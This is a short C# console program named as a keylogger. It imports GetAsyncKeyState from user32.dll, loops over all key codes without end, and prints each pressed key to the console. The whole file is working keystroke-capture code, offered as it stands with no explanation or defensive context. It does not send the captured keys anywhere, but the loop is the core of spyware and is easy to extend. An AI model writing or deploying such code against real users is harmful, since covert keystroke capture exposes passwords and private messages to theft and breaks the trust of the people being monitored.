using System;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace keylogger
{
    class Program
    {
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(int i);
       
        static void Main(string[] args)
        {
            while(true)
            {
                for(int i=0;i<255;i++)
                {
                   
                    if(GetAsyncKeyState(i)== 32769)
                    {
                        Console.WriteLine((Keys)i);
                    }                 
                }
                Thread.Sleep(10);
            }
        }
    }
}

